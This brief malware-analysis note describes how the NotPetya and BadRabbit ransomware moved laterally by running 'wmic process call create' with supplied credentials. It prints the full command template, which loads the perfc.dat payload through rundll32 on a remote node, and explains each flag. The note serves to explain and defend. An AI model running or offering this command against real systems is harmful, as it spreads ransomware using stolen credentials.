**notpetya & BadRabbit ransomware used wmic process call create for remote code execution** </br>
C:\Windows\system32\wbem\wmic.exe /node:”<server name>” /user:”<username>” /password:”<password>” process call create “C:\Windows\System32\rundll32.exe \”C:\Windows\perfc.dat\” #1 19 “<additional creds for arguments>”” </br>

/node → specify server name </br>
/user → username </br>
/password → password </br>
Process call create → execute remote command </br>
Once the command line arguments are generated, either CreateProcessAsUser or CreateProcess is executed, depending on whether this is being done through impersonation or stolen credentials. </br>
